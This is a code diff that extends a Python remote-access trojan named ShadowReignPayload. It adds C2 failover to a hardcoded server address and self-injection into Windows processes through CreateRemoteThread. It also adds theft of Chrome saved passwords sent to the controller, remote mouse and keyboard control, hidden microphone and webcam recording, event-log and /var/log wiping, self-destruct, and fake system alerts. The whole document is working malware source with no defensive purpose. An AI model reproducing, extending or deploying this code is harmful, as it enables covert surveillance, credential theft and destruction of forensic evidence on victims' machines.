@@ -6,6 +6,7 @@ import subprocess
 import platform
 import shutil
 import pynput.keyboard as kb
+import pynput.mouse as ms
 import mss
 import cv2
 import pyaudio
@@ -14,28 +15,33 @@ import pyttsx3
 import psutil
 import time
 import base64
+import sqlite3
+import tkinter as tk
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 import numpy as np
 import random
 import string
+import ctypes  # For process injection (Windows)
+import win32crypt  # For credential harvesting (Windows)
 
-# Random name generator for persistence
 def rand_name(length=10):
     return ''.join(random.choices(string.ascii_letters, k=length))
 
 class ShadowReignPayload:
     def __init__(self):
-        self.c2 = ("192.168.1.133", 5251)  # Update to your C2 server IP
-        self.KEY = b"ShadowReignBoss!"  # 16-byte encryption key
+        self.c2_list = [("192.168.1.133", 5251)]  # Dynamic C2 list, update primary IP
+        self.current_c2_index = 0
+        self.KEY = b"ShadowReignBoss!"
         self.sock = None
-        self.anti_vm_enabled = False  # Off by default
+        self.anti_vm_enabled = False
         self.keylogger = None
         self.running = True
         self.command_queue = []
         self.streaming_screen = False
         self.streaming_webcam = False
         self.streaming_mic = False
+        self.offline_queue_file = os.path.join(os.getenv("APPDATA", "/tmp"), "sr_queue.enc")
         self.connect()
         self.persistence()
 
@@ -60,25 +66,32 @@ class ShadowReignPayload:
             return None
 
     def send_message(self, message):
-        encrypted = self.encrypt(message)
-        if not encrypted:
-            return
-        length = len(encrypted)
-        length_bytes = length.to_bytes(4, byteorder='big')
-        self.sock.send(length_bytes + encrypted.encode())
+        try:
+            encrypted = self.encrypt(message)
+            if not encrypted or not self.sock:
+                self.queue_offline(message)
+                return
+            length = len(encrypted)
+            length_bytes = length.to_bytes(4, byteorder='big')
+            self.sock.send(length_bytes + encrypted.encode())
+            time.sleep(0.01)
+        except Exception:
+            self.connect()
 
     def connect(self):
         delay = 5
-        while self.running:
+        while self.running and not self.sock:
             try:
                 if self.sock:
                     self.sock.close()
                 self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                self.sock.connect(self.c2)
+                self.sock.connect(self.c2_list[self.current_c2_index])
                 self.send_info()
+                self.execute_offline_queue()
                 self.listen()
                 break
             except Exception:
+                self.current_c2_index = (self.current_c2_index + 1) % len(self.c2_list)  # Switch C2
                 time.sleep(delay)
                 delay = min(delay * 2, 60)
 
@@ -104,6 +117,7 @@ class ShadowReignPayload:
             try:
                 length_bytes = self.sock.recv(4)
                 if not length_bytes:
+                    self.sock = None
                     self.connect()
                     continue
                 length = int.from_bytes(length_bytes, byteorder='big')
@@ -112,6 +126,7 @@ class ShadowReignPayload:
                 self.command_queue.append((cmd["command"], cmd.get("data")))
                 self.execute_next()
             except Exception:
+                self.sock = None
                 self.connect()
 
     def execute_next(self):
@@ -140,7 +155,16 @@ class ShadowReignPayload:
             "stream_mic": self.stream_mic,
             "stop_stream": self.stop_stream,
             "toggle_anti_vm": self.toggle_anti_vm,
-            "reconnect": self.reconnect
+            "inject": self.inject_process,
+            "queue_command": self.queue_command,
+            "self_destruct": self.self_destruct,
+            "remote_desktop": self.remote_desktop,
+            "harvest_creds": self.harvest_creds,
+            "record_av": self.record_av,
+            "spoof_info": self.spoof_info,
+            "clear_logs": self.clear_logs,
+            "switch_c2": self.switch_c2,
+            "fake_alert": self.fake_alert
         }
         if command in handlers:
             try:
@@ -160,16 +184,178 @@ class ShadowReignPayload:
         except Exception:
             pass
 
-    def reconnect(self, _):
+    def queue_offline(self, message):
         try:
-            # Relaunch in background and exit current instance
-            if platform.system() == "Windows":
-                subprocess.Popen(f"pythonw {os.path.abspath(__file__)}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            if os.path.exists(self.offline_queue_file):
+                with open(self.offline_queue_file, "r") as f:
+                    queue = json.loads(self.decrypt(f.read()))
             else:
-                subprocess.Popen(f"python3 {os.path.abspath(__file__)} &", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            self.running = False  # Exit current instance
+                queue = []
+            queue.append(message)
+            with open(self.offline_queue_file, "w") as f:
+                f.write(self.encrypt(json.dumps(queue)))
+        except Exception:
+            pass
+
+    def execute_offline_queue(self):
+        try:
+            if os.path.exists(self.offline_queue_file):
+                with open(self.offline_queue_file, "r") as f:
+                    queue = json.loads(self.decrypt(f.read()))
+                for message in queue:
+                    cmd = json.loads(message)
+                    self.command_queue.append((cmd["command"], cmd.get("data")))
+                os.remove(self.offline_queue_file)
+                self.execute_next()
+        except Exception:
+            pass
+
+    def inject_process(self, process_name):
+        if platform.system() != "Windows":
+            self.send_message(json.dumps({"error": "Injection only supported on Windows"}))
+            return
+        try:
+            pid = [p.info["pid"] for p in psutil.process_iter(attrs=["pid", "name"]) if p.info["name"] == process_name][0]
+            handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, pid)
+            code = open(__file__, "rb").read()
+            mem = ctypes.windll.kernel32.VirtualAllocEx(handle, 0, len(code), 0x3000, 0x40)
+            ctypes.windll.kernel32.WriteProcessMemory(handle, mem, code, len(code), 0)
+            ctypes.windll.kernel32.CreateRemoteThread(handle, 0, 0, mem, 0, 0, 0)
+            self.send_message(json.dumps({"status": f"Injected into {process_name}"}))
         except Exception as e:
-            self.send_message(json.dumps({"error": f"Reconnect failed: {str(e)}"}))
+            self.send_message(json.dumps({"error": str(e)}))
+
+    def queue_command(self, data):
+        cmd = data["command"]
+        self.queue_offline(json.dumps({"command": cmd, "data": data.get("data")}))
+        self.send_message(json.dumps({"status": f"Command {cmd} queued"}))
+
+    def self_destruct(self, _):
+        try:
+            if platform.system() == "Windows":
+                subprocess.Popen(f'reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {rand_name()} /f', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            else:
+                subprocess.Popen("crontab -r", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            with open(__file__, "wb") as f:
+                f.write(os.urandom(os.path.getsize(__file__)))
+            os.remove(__file__)
+            self.running = False
+            self.send_message(json.dumps({"status": "Self-destruct complete"}))
+            exit(0)
+        except Exception as e:
+            self.send_message(json.dumps({"error": str(e)}))
+
+    def remote_desktop(self, data):
+        action = data["action"]
+        if action == "start":
+            self.streaming_screen = True
+            threading.Thread(target=self._remote_desktop_stream, daemon=True).start()
+        elif action == "mouse":
+            ms.Controller().position = (data["x"], data["y"])
+            if data.get("click"):
+                ms.Controller().click(ms.Button.left, 1)
+        elif action == "key":
+            kb.Controller().press(data["key"])
+            kb.Controller().release(data["key"])
+
+    def _remote_desktop_stream(self):
+        try:
+            sct = mss.mss()
+            while self.streaming_screen:
+                img = sct.grab(sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0])
+                frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGRA2BGR)
+                _, buffer = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
+                self.send_message(json.dumps({"remote_frame": base64.b64encode(buffer).decode()}))
+                time.sleep(0.033)  # ~30 FPS
+        except Exception as e:
+            self.send_message(json.dumps({"error": str(e)}))
+
+    def harvest_creds(self, _):
+        creds = {}
+        try:
+            if platform.system() == "Windows":
+                path = os.path.join(os.getenv("APPDATA"), r"..\Local\Google\Chrome\User Data\Default\Login Data")
+                if os.path.exists(path):
+                    conn = sqlite3.connect(path)
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                    for url, user, pwd in cursor.fetchall():
+                        pwd = win32crypt.CryptUnprotectData(pwd)[1].decode()
+                        creds[url] = {"user": user, "pass": pwd}
+                    conn.close()
+            self.send_message(json.dumps({"creds": creds}))
+        except Exception as e:
+            self.send_message(json.dumps({"error": str(e)}))
+
+    def record_av(self, data):
+        duration = int(data["duration"])
+        type_ = data["type"]
+        try:
+            if type_ == "audio":
+                p = pyaudio.PyAudio()
+                stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
+                frames = []
+                for _ in range(0, int(44100 / 1024 * duration)):
+                    frames.append(stream.read(1024))
+                stream.stop_stream()
+                stream.close()
+                p.terminate()
+                with wave.open("audio.wav", "wb") as wf:
+                    wf.setnchannels(1)
+                    wf.setsampwidth(2)
+                    wf.setframerate(44100)
+                    wf.writeframes(b''.join(frames))
+                with open("audio.wav", "rb") as f:
+                    self.send_message(json.dumps({"audio_rec": base64.b64encode(f.read()).decode()}))
+                os.remove("audio.wav")
+            elif type_ == "video":
+                cap = cv2.VideoCapture(0)
+                fourcc = cv2.VideoWriter_fourcc(*"XVID")
+                out = cv2.VideoWriter("video.avi", fourcc, 20.0, (640, 480))
+                start = time.time()
+                while time.time() - start < duration:
+                    ret, frame = cap.read()
+                    if ret:
+                        out.write(frame)
+                cap.release()
+                out.release()
+                with open("video.avi", "rb") as f:
+                    self.send_message(json.dumps({"video_rec": base64.b64encode(f.read()).decode()}))
+                os.remove("video.avi")
+        except Exception as e:
+            self.send_message(json.dumps({"error": str(e)}))
+
+    def spoof_info(self, data):
+        self.fake_info = data
+        self.send_message(json.dumps({"status": "Info spoofed"}))
+
+    def clear_logs(self, _):
+        try:
+            if platform.system() == "Windows":
+                subprocess.Popen("wevtutil cl System", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                subprocess.Popen("wevtutil cl Application", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            else:
+                subprocess.Popen("rm -rf /var/log/*", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            self.send_message(json.dumps({"status": "Logs cleared"}))
+        except Exception as e:
+            self.send_message(json.dumps({"error": str(e)}))
+
+    def switch_c2(self, data):
+        self.c2_list = [(ip, port) for ip, port in data["c2_list"]]
+        self.current_c2_index = 0
+        self.sock = None
+        self.connect()
+        self.send_message(json.dumps({"status": "C2 list updated"}))
+
+    def fake_alert(self, data):
+        try:
+            root = tk.Tk()
+            root.withdraw()
+            tk.messagebox.showerror("System Alert", data["message"])
+            root.destroy()
+            self.send_message(json.dumps({"status": "Fake alert shown"}))
+        except Exception as e:
+            self.send_message(json.dumps({"error": str(e)}))
 
     def toggle_anti_vm(self, enable):
         self.anti_vm_enabled = bool(enable)
@@ -430,4 +616,4 @@ if __name__ == "__main__":
     payload = ShadowReignPayload()
     payload.anti_analysis()
     while payload.running:
-        time.sleep(1)  # Keep main thread alive
+        time.sleep(1)
